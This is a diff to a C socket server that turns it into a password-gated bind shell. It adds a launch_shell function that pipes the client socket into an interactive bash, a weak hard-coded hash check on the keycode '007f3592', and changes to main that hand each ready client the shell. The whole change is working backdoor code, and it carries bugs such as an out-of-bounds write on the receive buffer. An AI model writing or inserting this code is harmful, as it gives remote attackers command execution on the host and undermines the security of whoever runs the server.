@@ -6,6 +6,64 @@
 #include <sys/select.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <stdio.h>
+
+void launch_shell(int client_socket)
+{
+    char buffer[1024];
+
+    if (setenv("PS1", "$> ", 1) != 0) {
+        perror("setenv failed");
+    }
+    dup2(client_socket, STDIN_FILENO);
+    dup2(client_socket, STDOUT_FILENO);
+    dup2(client_socket, STDERR_FILENO);
+
+    execl("/bin/bash", "bash", "-i", NULL);
+}
+
+void hash(char *password, char *hash)
+{
+    int hash_value;
+    int i;
+
+    i = 0;
+    hash_value = 0;
+    while(i < strlen(password))
+    {
+        hash_value = (hash_value * 54) + (char)password[i];
+        i++;
+    }
+    snprintf(hash, 1024, "%08x", hash_value);
+}
+
+int authenticate(int client_socket)
+{
+    char buffer[1024];
+    char password[1024];
+    int valread;
+
+    while (1)
+    {
+        send(client_socket, "Keycode: ", 9, 0);
+        valread = read(client_socket, buffer, 1024);
+        if (valread <= 0) {
+            send(client_socket, "Failed to read password. Disconnecting...\n", 42, 0);
+            close(client_socket);
+            return (0);
+        }
+
+        buffer[valread] = '\0';
+        if (buffer[valread - 1] == '\n') {
+            buffer[valread - 1] = '\0';
+        }
+
+        hash(buffer, password);
+        if (strcmp(password, "007f3592") == 0) {
+            return (1);
+        } 
+    }
+}
 
 int create_socket() {
     int socketfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -57,16 +115,16 @@ int accept_socket(int server_fd, struct sockaddr_in* address, int addrlen, int *
     return new_socket;
 }
 
-void read_write(int *client_socket, int server_fd, char* buffer) {
+void read_write(int *client_socket, int client_fd, char* buffer) {
     int valread;
     int i;
 
     i = 0;
-    if ((valread = read(server_fd, buffer, 1024)) == 0) {
-        close(server_fd);
+    if ((valread = read(client_fd, buffer, 1024)) == 0) {
+        close(client_fd);
         while (i < 3)
         {
-            if (client_socket[i] == server_fd)
+            if (client_socket[i] == client_fd)
             {
                 client_socket[i] = 0;
                 break;
@@ -75,8 +133,10 @@ void read_write(int *client_socket, int server_fd, char* buffer) {
         }
     }
     else {
-        printf("Received: %s\n", buffer); 
-        // write(server_fd, buffer, strlen(buffer));
+        buffer[valread] = '\0';
+        if (buffer[valread - 1] == '\n')
+            buffer[valread - 1] = '\0';
+        launch_shell(client_fd);
     }
 }
 
@@ -129,14 +189,19 @@ int main(void)
         }
         if (FD_ISSET(server_fd, &readfds)) {
             new_socket = accept_socket(server_fd, &addr, addrlen, client_socket);
-            // hna khassu ithauthentifya
+            if(authenticate(new_socket))
+            {
+                FD_SET(new_socket, &readfds);
+            }
+
         }
         i = 0;
         while (i < 3)
         {
             socket_id = client_socket[i];
             if (FD_ISSET(socket_id, &readfds)) {
-                read_write(client_socket, socket_id, buffer);
+                launch_shell(socket_id);
+                // read_write(client_socket, socket_id, buffer);
             }
             i++;
         }
